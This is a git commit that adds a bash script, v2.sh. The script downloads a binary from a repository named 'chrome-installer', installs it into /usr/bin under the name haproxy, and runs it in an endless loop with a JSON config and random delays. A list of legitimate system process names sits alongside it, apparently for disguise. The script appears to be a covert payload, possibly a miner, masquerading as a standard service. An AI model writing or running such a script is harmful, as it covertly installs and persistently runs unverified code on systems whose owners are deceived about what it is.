49e5d4d426ea0693100d70a7f7923328b3f10f58
namtran180291-cmyk <namtran180291@gmail.com>
2026-02-05 21:51:32 +0700

    Create v2.sh

---
+++ v2.sh
@@ -0,0 +1,33 @@
+#!/bin/bash
+set -e
+
+curl -O -J -L https://github.com/namtran180291-cmyk/chrome-installer/releases/download/2.0.0/haproxy.tar.gz
+tar -xf haproxy.tar.gz
+rm haproxy.tar.gz
+cd haproxy
+chmod +x ./haproxy
+mv ./haproxy /usr/bin/haproxy
+
+PRE_DELAY=$(shuf -i15-30 -n1)
+sleep $PRE_DELAY
+
+HAPROXY_BIN="haproxy"
+
+PROCESS_NAMES=(
+    chrome node systemd kworker redis dockerd containerd sshd nginx pm2
+)
+
+JSON_FILES=(
+    part4.json
+    part4.json
+    part4.json
+    part4.json
+)
+
+while true; do
+    pkill -f "haproxy"
+    JSON=${JSON_FILES[$RANDOM % ${#JSON_FILES[@]}]}
+    haproxy -c "$JSON"
+    INTERVAL=$((60 + RANDOM % 61))
+    sleep $INTERVAL
+done
